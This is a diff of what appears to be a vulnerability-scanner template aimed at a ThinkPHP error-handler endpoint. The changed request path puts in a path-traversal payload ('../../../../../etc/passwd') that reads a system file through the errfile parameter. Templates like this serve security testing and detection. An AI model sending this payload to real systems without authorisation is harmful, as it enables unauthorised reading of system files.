@@ -12,7 +12,7 @@ info:
 requests:
   - method: GET
     path:
-      - '{{BaseURL}}/index.php?s=index/think\Error/appError&errno=1&errstr=%3C&errline=30&errfile=/www/wwwroot/'
+      - '{{BaseURL}}/index.php?s=index/think\Error/appError&errno=1&errstr=%3C&errline=30&errfile=../../../../../etc/passwd'
 
 
     matchers-condition: and
